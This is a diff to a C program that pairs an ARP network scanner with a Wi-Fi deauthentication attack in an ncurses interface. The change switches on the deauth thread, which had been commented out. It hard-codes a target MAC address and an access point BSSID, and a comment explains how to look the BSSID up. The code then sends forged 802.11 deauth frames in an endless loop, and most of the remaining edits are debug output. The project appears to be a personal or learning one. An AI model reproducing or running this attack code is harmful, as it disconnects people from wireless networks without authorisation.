@@ -85,18 +85,19 @@ int main(int argc, char* argv[])
 
   receiverStr mapStr = {connFd, arp_resp, wins};
   sender_pck send_pck = {connFd, wins};
-  deauth_pck dth_pck = {connFd, wins, "7a:ff:c2:49:88:d7", "FRITZ!Box 7530 TT 2,4"}; 
+  //First is target, seconds i bssid of accesspoint, retrievable with 'sudo iwlist scanning' under address
+  deauth_pck dth_pck = {connFd, wins, "b6:94:31:6c:3b:f9", "DC:39:6F:1D:DE:67"}; 
 
   pthread_t receiverThread, senderThread;
   pthread_t deauthThread;
   wprintw(wins->arp_right->win, "Done\n");
-//  pthread_create(&deauthThread, NULL, deauthAttack, &dth_pck);
+  pthread_create(&deauthThread, NULL, deauthAttack, &dth_pck);
   pthread_create(&senderThread, NULL, sendArpRequest, &send_pck);
   pthread_create(&receiverThread, NULL, recvMessage, &mapStr);
 
   pthread_join(receiverThread, 0);
   pthread_join(senderThread, 0);
- // pthread_join(deauthThread, 0);
+  pthread_join(deauthThread, 0);
   
   endwin();
   return 0;
@@ -106,7 +107,7 @@ char* getSMac()
 {
   //FILE* ptr = fopen("/sys/class/net/wlp3s0/address", "r");
   //FILE* ptr = fopen("/sys/class/net/ni0h/address", "r");
-  FILE* ptr = fopen("/sys/class/net/wlan1/address", "r");
+  FILE* ptr = fopen("/sys/class/net/wlan0/address", "r");
   char* smac = (char*)calloc((MAC_COLON_LEN + 1), sizeof(char));
   if(!smac)
   {
@@ -122,7 +123,7 @@ char* getBroadcastMac()
 {
   //FILE* ptr = fopen("/sys/class/net/wlp3s0/broadcast", "r");
   //FILE* ptr = fopen("/sys/class/net/ni0h/broadcast", "r");
-  FILE* ptr = fopen("/sys/class/net/wlan1/broadcast", "r");
+  FILE* ptr = fopen("/sys/class/net/wlan0/broadcast", "r");
   char* broad = (char*)calloc((MAC_COLON_LEN + 1), sizeof(char));
   if(!broad)
   {
@@ -246,6 +247,7 @@ void addArpMapping(winStruct* wins, struct arpCont* arpContResp, arp_resp_info* 
   mvwchgat(wins->arp_left->win, resp_info->selected, 0, -1, A_REVERSE, 1, NULL);
   wmove(wins->arp_left->win, old_row, old_col);
   update_panels();
+  doupdate();
 }
 
 int updateAddr(struct in_addr* currAddr, uint8_t* startAddr, uint8_t* endAddr)
@@ -283,6 +285,7 @@ int updateAddr(struct in_addr* currAddr, uint8_t* startAddr, uint8_t* endAddr)
 
 void* sendArpRequest(void* param)
 {
+  char scanBarElements[4] = {'|', '/', '-', '\\'};
   int sent;
   char* buf = (char*)malloc(1024);
   winStruct* wins = ((sender_pck*)param)->wins_;
@@ -383,7 +386,6 @@ void* sendArpRequest(void* param)
     return (void*)-1;
   }
   wprintw(wins->arp_right->win, "%s\n", inet_ntoa(netmask->sin_addr));
-  update_panels();
   if(!ownIp)
   {
     wprintw(wins->arp_right->win, "Fatal no own ip found\n");
@@ -419,13 +421,13 @@ void* sendArpRequest(void* param)
   memcpy(&socket_address.sll_addr, ethHdr->ether_dhost, ETH_ALEN);
   struct in_addr currAddr = startAddr;
 
-  wprintw(wins->arp_right->win, "[+] Scanning network\n");
   do {
     bufSize = sizeof(struct ether_header) + sizeof(struct arphdr);
     struct arpCont* arpReq = (struct arpCont*)(buf + bufSize);
     memcpy(arpReq->sender_mac, ethHdr->ether_shost, ETH_ALEN);
     //wprintw(wins->arp_right->win, "[+] ARP Request for %s\n", inet_ntoa(currAddr));
-    update_panels();
+    //update_panels();
+    //doupdate();
     inet_pton(AF_INET, inet_ntoa(currAddr), &arpReq->target_ip);
     memcpy(&arpReq->sender_ip, &ownIp->sin_addr.s_addr, 4);
     bufSize += sizeof(struct arpCont);
@@ -433,15 +435,23 @@ void* sendArpRequest(void* param)
     if((sent = sendto(connFd, buf, bufSize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
     {
       wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
+      update_panels();
+      doupdate();
     }
     if(updateAddr(&currAddr, startIp, endIp))
     {
-      wprintw(wins->arp_right->win, "[+] Scanning network\n");
-      sleep(5);
+      for(int cnt = 0; cnt < 4; cnt++)
+      {
+        wprintw(wins->arp_right->win, "\r%c Scanning network", scanBarElements[cnt]);
+        update_panels();
+        doupdate();
+        sleep(5/4);
+      }
     }
   } while(1);
   return 0;
 }
+
 
 void* recvMessage(void* param)
 {
@@ -457,7 +467,9 @@ void* recvMessage(void* param)
   {
     if((sent = recvfrom(connFd, responseBuf, 42, 0, NULL, NULL)) == -1)
     {
-      wprintw(wins->arp_left->win, "Fail\n");
+      wprintw(wins->arp_right->win, "Fail\n");
+      update_panels();
+      doupdate();
       continue;
     }
 //    struct ether_header* ethHdrResp =  (struct ether_header*)responseBuf;
@@ -479,8 +491,6 @@ void* recvMessage(void* param)
       addArpMapping(wins, arpContResp, resp_info);
     }
     pthread_mutex_unlock(&lock);
-    refresh();
-    update_panels();
   }
 }
 
@@ -516,11 +526,16 @@ void* deauthAttack(void* param)
   strncpy(if_mac.ifr_name, VIRT_NET, IFNAMSIZ-1);
   if (ioctl(connFd, SIOCGIFHWADDR, &if_mac) < 0)
     perror("SIOCGIFHWADDR");
+  wprintw(wins->arp_right->win, "Performing deauth attack on interface %s, vs %s on network %s\n", if_mac.ifr_ifrn.ifrn_name, pck->dmac, pck->bssid);
+
+
   int sent;
   int counter = 0;
   char* buf = (char*)calloc(1024, sizeof(char));
   int bufSize = 0;
   wprintw(wins->arp_right->win, "Done\n");
+  update_panels();
+  doupdate();
   //  memcpy(buf, "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01\xff\xff\xff\xff\xff\xff\xc8\xd7\x79\xd0\xa2\x81\xc8\xd7\x79\xd0\xa2\x81\x00\x00\x07\x00", 38);
   //  bufSize = 38;
   struct ieee80211_radiotap_header* radiotap_hdr = (struct ieee80211_radiotap_header*)buf;
@@ -548,8 +563,26 @@ void* deauthAttack(void* param)
   //  bufSize+= 2;
 
   mac2UInt8Arr(pck->dmac, macHdr->dmac);
+  wprintw(wins->arp_right->win, "DMAC: ");
+  for(int i = 0; i <6; i++)
+  {
+    wprintw(wins->arp_right->win, "%x:", macHdr->dmac[i]);
+  }
+  wprintw(wins->arp_right->win, "\b\n");
   mac2UInt8Arr(pck->bssid, macHdr->smac);
+  wprintw(wins->arp_right->win, "SMAC: ");
+  for(int i = 0; i <6; i++)
+  {
+    wprintw(wins->arp_right->win, "%x:", macHdr->smac[i]);
+  }
+  wprintw(wins->arp_right->win, "\b\n");
   mac2UInt8Arr(pck->bssid, macHdr->bssid);
+  wprintw(wins->arp_right->win, "BSSID: ");
+  for(int i = 0; i <6; i++)
+  {
+    wprintw(wins->arp_right->win, "%x:", macHdr->bssid[i]);
+  }
+  wprintw(wins->arp_right->win, "\b\n");
 
   char* broad= getBroadcastMac();
   if(!broad)
@@ -558,6 +591,12 @@ void* deauthAttack(void* param)
   }
   uint8_t  ether_dhost[ETH_ALEN];	/* destination eth addr	*/
   mac2UInt8Arr(broad, ether_dhost);
+  wprintw(wins->arp_right->win, "DHOST: ");
+  for(int i = 0; i <6; i++)
+  {
+    wprintw(wins->arp_right->win, "%x:", ether_dhost[i]);
+  }
+  wprintw(wins->arp_right->win, "\b\n");
   struct sockaddr_ll socket_address;
   /* Index of the network device */
   socket_address.sll_ifindex = if_idx.ifr_ifindex;
@@ -567,21 +606,29 @@ void* deauthAttack(void* param)
   FILE* fl = fopen("test", "wb");
   fwrite(buf, sizeof(char), bufSize, fl);
   fclose(fl);
-  //  wprintw(wins->arp_left->win, "CONTENT: ");
-  //  for(int i = 0; i < bufSize; i++)
-  //  {
-  //    wprintw(wins->arp_left->win, "%hhx ", (*(buf + i)));
-  //  }
+  wprintw(wins->arp_right->win, "CONTENT: ");
+  for(int i = 0; i < bufSize; i++)
+  {
+    wprintw(wins->arp_right->win, "%hhx ", (*(buf + i)));
+  }
+
+  wprintw(wins->arp_right->win, "ConnFd %d idx %d, %s\n", connFd, socket_address.sll_ifindex, ((struct sockaddr*)&socket_address)->sa_data);
 
   int ctr = 0;
+  for(int i = 0; i < 14; i++)
+  {
+    wprintw(wins->arp_right->win, "%d ", (*(((struct sockaddr*)&socket_address)->sa_data + i)));
+  }
   while(1)
   {
     if((sent = sendto(connFd, buf, bufSize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
     {
-      wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
+      if(ctr++ == 0)
+        wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
     }
     else
     {
+    if(ctr++ == 0)
       wprintw(wins->arp_right->win, "Sent deauth, len %d, total %d\n", sent, bufSize);
     }
     //    usleep(100000);
